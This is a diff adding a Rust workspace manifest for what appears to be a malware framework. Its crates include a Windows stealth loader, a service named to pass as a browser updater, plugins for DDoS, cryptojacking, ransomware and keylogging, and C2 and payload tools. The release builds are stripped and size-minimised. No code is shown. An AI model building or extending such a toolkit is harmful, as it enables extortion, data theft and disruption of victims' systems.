@@ -1,0 +1,33 @@
+[workspace]
+resolver = "2"
+members = [
+    # Core infrastructure
+    "crates/shared/protocol",
+    "crates/shared/plugin_api",
+
+    
+    # Node applications
+    "crates/nodes/phantom",
+    
+    # Standalone tools
+    "crates/tools/dns_signer",
+    "crates/nodes/edge/src/stealth/windows/loader",
+    "crates/nodes/edge/src/stealth/windows/edge_update_svc",
+    
+    # Plugins
+    "crates/nodes/edge",
+    "crates/plugins/ddos",
+    "crates/plugins/cryptojacking",
+    "crates/plugins/ransomware",
+    "crates/plugins/keylogger",
+    "crates/plugins/calc",
+    "crates/plugins/shell",
+    "tools/steg_maker_build", "crates/tools/log_viewer", "tools/c2_helper", "tools/ghost_run", "tools/ghost_payload",
+]
+
+[profile.release]
+strip = true
+opt-level = "z"
+lto = true
+codegen-units = 1
+panic = "abort"
